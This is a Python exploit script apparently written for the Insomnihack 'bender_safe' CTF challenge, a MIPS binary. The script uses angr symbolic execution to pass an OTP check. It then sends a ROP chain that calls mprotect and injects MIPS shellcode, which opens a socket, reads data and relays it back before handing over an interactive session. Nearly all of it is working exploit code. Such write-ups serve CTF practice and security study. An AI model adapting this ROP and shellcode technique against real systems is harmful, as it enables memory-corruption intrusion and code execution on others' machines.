import angr, claripy
from pwn import *
from hexdump import hexdump
import socket
import telnetlib

HOST, PORT = '0.0.0.0', 30000
HOST, PORT = 'bender_safe.teaser.insomnihack.ch', 31337
elf = ELF('/=/Downloads/bender_safe-d9df66e258a888af77cbc75567287330920447c9/challenge/bender_safe')
context.arch = 'mips'
context.endian = 'big'

def recvuntil(t):
	d = ''
	while t not in d:
		c = r.recv(1)
		if c == '':
			print 'socket error'
			exit()
		d += c
	return d

recvline = lambda: recvuntil('\n')
sendline = lambda x: r.send(x + '\n')
remote = lambda host, port: socket.create_connection((host, port))

r = remote(HOST, PORT)
t = telnetlib.Telnet()
t.sock = r
recvuntil(' :')
recvline()
otp = recvline().strip()
p = angr.Project('/=/Downloads/bender_safe-d9df66e258a888af77cbc75567287330920447c9/challenge/bender_safe')

e = p.factory.entry_state(addr=0x401c50)
input_addr = 0x10000000
otp_addr = 0x20000000
input_value = claripy.BVS('input', 8 * 9)
e.memory.store(input_addr, input_value)
e.memory.store(otp_addr, otp)
e.regs.a0 = otp_addr
e.regs.a1 = input_addr

pg = p.factory.path_group(e)
pg.explore(find=0x402d0c, avoid=[0x40988c, 0x40adf0])
found = pg.found[0]
value = found.state.se.any_str(input_value)
mprotect = elf.symbols['mprotect']
print `found`
print `value`
value = value.strip('\x00')
sendline(value)
sendline('2')
sendline('13')
sendline('')
for i in range(9):
	sendline('lol')

fp = 0
pc = 0x41db0c
buf = 0x4a7000	
shellcode = asm('''
	li $a0, 0x479000
	li $a1, 0x1000
	li $a2, 7
	li $v0, 0x101d
	syscall 0
	nop
	li $v0, 0x479f76
	li $v1, 0x32
	sb $v1, 0($v0)
	li $v0, 0x401320
	jalr $v0
	nop
	li $v0, 0xfa0+183
	li $a0, 2
	li $a1, 2
	li $a2, 0
	syscall 0
	nop
	move $s0, $v0
	li $s1, 31337+0x20000
	sw $s1, ($sp)
	li $s1, (127<<24)+(1<<0)
	sw $s1, 4($sp)
	li $v0, 0xfa0+170
	move $a0, $s0
	move $a1, $sp
	li $a2, 16
	syscall 0
	nop
	li $v0, 0xfa0+3
	li $a2, 0x100
	syscall 0
	nop
	move $a2, $v0
	li $v0, 0xfa0+4
	li $a0, 1
	syscall 0
	nop
	li $s1, 0x43000000
	sw $s1, ($sp)
	move $a0, $s0
	li $a2, 2
	li $v0, 0xfa0+4
	syscall 0
	nop
	li $v0, 0xfa0+3
	li $a2, 0x100
	syscall 0
	nop
	li $a0, 1
	move $a2, $v0
	li $v0, 0xfa0+4
	syscall 0
	nop
	li $v0, 0x1096
	syscall 0
	nop
	''')
hexdump(shellcode)
read_release = 0x4015dc
ppp = lambda *x: ''.join(p32(y) for y in x)
rop = p32(0) + p32(0) + p32(fp)
rop += p32(0x4185ec) + 'a' * 24 + ppp(read_release, 0, 0) + p32(0x4185ec) + 'a' * 24 + ppp(0, 0, 0) + p32(0x45f160) + 'a' * 15 + ppp(buf, len(shellcode) + 1, 0, 0, 0x413534, 0x4185ec)
rop += p32(0x4185ec) + 'a' * 20 + ppp(mprotect, 0, 0) + p32(0x4185ec) + 'a' * 23 + ppp(0, 0, 0) + p32(0x45f160) + 'a' * 16 + ppp(buf, 0x1000, 7, 0, 0, buf)
print len(rop)
for i in range(3):
	r.send(rop[i*100:i*100+100].ljust(100, "\x00"))

sendline('\n4')
r.send(shellcode)
t.interact()